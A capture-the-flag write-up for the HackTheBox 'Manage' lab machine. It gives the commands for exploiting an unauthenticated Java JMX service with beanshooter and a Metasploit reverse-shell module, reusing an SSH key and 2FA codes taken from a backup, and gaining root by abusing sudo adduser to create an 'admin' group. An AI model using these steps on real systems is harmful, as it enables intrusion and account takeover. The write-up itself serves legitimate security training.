# [HackTheBox - Manage](https://app.hackthebox.com/machines/Manage)

![64ef1c026f85600acf697abb162d4ec2.png](/resources/64ef1c026f85600acf697abb162d4ec2.png)

## Table of Contents

- [Abstract](#abstract)
- [Enumeration](#enumeration)
- [Initial Access via Java JMX interface insecure configuration](#initial-access-via-java-jmx-interface-insecure-configuration)
- [Privilege Escalation to useradmin via backup file](#privilege-escalation-to-useradmin-via-backup-file)
- [Privilege Escalation via SUDO by creating an admin user](#privilege-escalation-via-sudo-by-creating-an-admin-user)

***
## Abstract
Manage is a vulnlab machine imported to HackTheBox as an Easy Linux box, I started with network enumeration with nmap, revealing this machine is a running SSH on port 22, Java JMI on port 2222 and Apache Tomcat on port 8080.

The enumeration phase reveals that the MBean in JMX is not require authentication which I leveraged that by created and registered a malicious MBean that embeds executable Java bytecode to run and eventually got me foothold on the machine as tomcat user. 

After gaining a foothold, I discovered backup file of useradmin user which contains all files on the home directory of this user including SSH private key and 2FA backup code which I used that to connect to the box again as useradmin.

The useradmin user can create any user on the box with sudo and after discovered that the box does not have admin group which I created admin user that will automatically create admin group and become root by using user and root the box.

## Enumeration

I start my initial nmap scanning with `-sCV` flag right away since I don't expect much port to be running on Linux box which reveals SSH running on port 22, Java JMI Service running on port 2222 and Apache Tomcat running on port 8080.

![898e924e370738a7b08b328e4362b577.png](/resources/898e924e370738a7b08b328e4362b577.png)

I start by checking tomcat first and nothing too interesting here beside the version that already obtained from the nmap result.

![9079d864b64c497525ffc813e92709dd.png](/resources/9079d864b64c497525ffc813e92709dd.png)

I try to see if I can login with tomcat default credential but look like it is restricted so I need to find another way in.

![951941acbd7999ab7f175d6d1a3d4cc9.png](/resources/951941acbd7999ab7f175d6d1a3d4cc9.png)

I will use [beanshooter](https://github.com/qtc-de/beanshooter) which is a JMX enumeration and attacking tool to identify common vulnerabilities on this JMX instance and I discover that Remote Mbean server on running on this box does not require authentication and discovered 2 tomcats here.

```
java -jar beanshooter-4.1.0-jar-with-dependencies.jar enum manage.vl 2222
```
![7e8fd2b9af3467bb4eee3b7c2c6967c7.png](/resources/7e8fd2b9af3467bb4eee3b7c2c6967c7.png)

![7be246a6b27436163ea47a81f1fa5faf.png](/resources/7be246a6b27436163ea47a81f1fa5faf.png)

## Initial Access via Java JMX interface insecure configuration

Since I can not login to tomcat then I'll take advantage of the misconfiguration of MBean server that do not required authentication to gain initial access by using "java_jmx_server" module in metasploit framework with will automatically setup JAR reverse shell payload and serve them to trigger it inside JVM process which will trigger a meterpreter reverse shell back to me as seen in the image below

```
msfconsole -q
use exploit/multi/misc/java_jmx_server
set rhost 10.129.234.57
set rport 2222
set lhost tun0
set lport 443
set srvport 5555
run
```
![e41a1f3f46f786361f16854dbb00bca2.png](/resources/e41a1f3f46f786361f16854dbb00bca2.png)

We can also use beanshooter to get the foothold as well.

```
java -jar beanshooter-4.1.0-jar-with-dependencies.jar standard manage.vl 2222 tonka
java -jar beanshooter-4.1.0-jar-with-dependencies.jar tonka shell manage.vl 2222
```
![b6ae6244c970924d3446b8196b5df3db.png](/resources/b6ae6244c970924d3446b8196b5df3db.png)

After gaining a foothold, I spawn a new shell and use python to spawn another pty shell and now I should have almost functionaly interactive shell to use on this box

```
shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
![e695de5f47ee61f63e4bc078c27d9c9c.png](/resources/e695de5f47ee61f63e4bc078c27d9c9c.png)

Then I read the `/etc/passwd` file to find out how many users with uid >= 1000 on this box and I can already see 3 of them including tomcat user and useradmin. notably the useradmin will likely to be the one that will be used to obtain root shell as its name imply.

![69e360cbc9e042bbd20b8a07c9c028c0.png](/resources/69e360cbc9e042bbd20b8a07c9c028c0.png)

The user flag is located on the home directory of tomcat user here.

![45b616f96b9228faaf0c30bca88b2715.png](/resources/45b616f96b9228faaf0c30bca88b2715.png)

## Privilege Escalation to useradmin via backup file

After exploring useradmin's home directory which I suspect to be the way to become root, I discover "backups" directory and ".google_authenticator" file which indicates that there might be 2FA here and it could possibly be the 2FA when connect to SSH

![81e9c7d0742af8641b528dff9f7e5bf0.png](/resources/81e9c7d0742af8641b528dff9f7e5bf0.png)

There is a compressed file inside "backups" folder that can be downloaded so I download it. 

```
exit
cd /home/useradmin/backups
download backup.tar.gz
```
![924d42d28c5028428c1e16f2b0c28d24.png](/resources/924d42d28c5028428c1e16f2b0c28d24.png)

After extracting the file, I can see that it conains all files from useradmin's home directory so now I will use SSH private key to connect to the box as useradmin.

```
tar -zxvf backup.tar.gz
```
![7c7b25de83b0693e81830e125f827990.png](/resources/7c7b25de83b0693e81830e125f827990.png)

SSH private key already have correct permission so I try to connect to the box again as useradmin and as expected. it asks me for Verification code.

![371d1af6cefbd718a4f1124eca9c9094.png](/resources/371d1af6cefbd718a4f1124eca9c9094.png)

I check the ".google_authenticator" file which reveal the verification code for the 2nd verification step so I will grab one of them to authenticate to the box again.

![3f65c2942ee92413e8be0c37e034459e.png](/resources/3f65c2942ee92413e8be0c37e034459e.png)

With the verification code and ssh private key from backup file, I successfully leverage myself to useradmin on this box. 

```
ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i id_ed25519 useradmin@manage.vl
```
![34c2b4690aa53839ba0cb841115688da.png](/resources/34c2b4690aa53839ba0cb841115688da.png)

## Privilege Escalation via SUDO by creating an admin user

First thing I check after obtain this user session is to check special privilege via SUDO and I discover that this user can create any user with sudo without a password but is that it?

```
sudo -l
```
![2ea0d9cff887df0121d25315a5b08343.png](/resources/2ea0d9cff887df0121d25315a5b08343.png)

After research for a bit. I found that there is no "admin" group on this machine and the Ubuntu's default sudo configuration in `/etc/sudoers` file will grant any member of admin group with admin privilege and can use SUDO to do anything. so what's the plan here?

Since this group did not exist on the system, creating a new user under the name of "admin" will also create admin group and thats mean I can basically create a new root user on this box.

![1a72044c335f93da544240f419dfcb65.png](/resources/1a72044c335f93da544240f419dfcb65.png)

So I create "admin" user with sudo which will also create admin group and this user will also be added to this group as expect so I switch useradmin to admin user and now I can become root with SUDO.

```
sudo /usr/sbin/adduser admin
su admin
```
![201af2c935806ea0f21ffc6f7a56f6a0.png](/resources/201af2c935806ea0f21ffc6f7a56f6a0.png)

So I switch admin to root with sudo and loot the root flag to root the box! 

```
sudo su
```
![d5c826b113b2f6203c1a6be2af89b5d9.png](/resources/d5c826b113b2f6203c1a6be2af89b5d9.png)

As now  I am root user, I check the `/etc/sudoers` file and we can see that with this configuration allows any user in admin group to basically have root privilege on this box just like user in sudo group/

On some Ubuntu installations the admin group is still configured to act like the sudo group (legacy/backwards-compatibility), whereas modern Ubuntu defaults to using the sudo group. This means creating a user in admin could immediately grant that user administrative rights if a %admin rule exists in sudoers..


![3d3cd48ea1015edfa1b8a1abc3b6d67d.png](/resources/3d3cd48ea1015edfa1b8a1abc3b6d67d.png)

![189ba9dc018522a55835044b82144ce5.png](/resources/189ba9dc018522a55835044b82144ce5.png)
https://labs.hackthebox.com/achievement/machine/1438364/687
***